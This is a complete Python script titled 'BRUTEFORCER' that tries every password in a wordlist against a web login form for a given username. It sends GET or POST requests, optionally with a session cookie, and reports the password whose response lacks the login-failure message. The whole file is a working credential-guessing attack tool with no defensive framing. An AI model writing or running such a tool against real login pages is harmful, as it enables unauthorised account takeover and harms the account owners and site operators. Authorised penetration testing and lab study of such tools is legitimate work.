import requests
import pyfiglet
banner = pyfiglet.figlet_format("BRUTEFORCER")
print(banner)
target = input('Enter the url: ')
username = input('Enter the username: ')
password_txt = input('Enter the path of pass file: ')
error_msg = input('Enter the error msg when login failed: ')
cookie_value = input("Enter the cookie value(OPTIONAL): ")
with open(password_txt, 'r') as f:
    passwords = f.read().splitlines()
print("[+] Starting Bruteforcing!")
print(f"[+] Username: {username}")
print(f"[*] Trying {len(passwords)} passwords") 
for password in passwords:
    
    if cookie_value != '':
        data = {
            'username':username,
            'password':password,
            'Login':'Login'
        }
        response = requests.get(target, params=data, cookies={'cookie':cookie_value})
    else:
        data = {
            'username':username,
            'password':password,
            'Login':'submit'
            }
        response = requests.post(target, data=data)
    if error_msg not in response.text:
        print(f"[+] Password Found:{password}")
        break
    else:
        print(f"[-] password failed:{password}")
else:
    print("[-] passwords not found in the password_txt list")

        
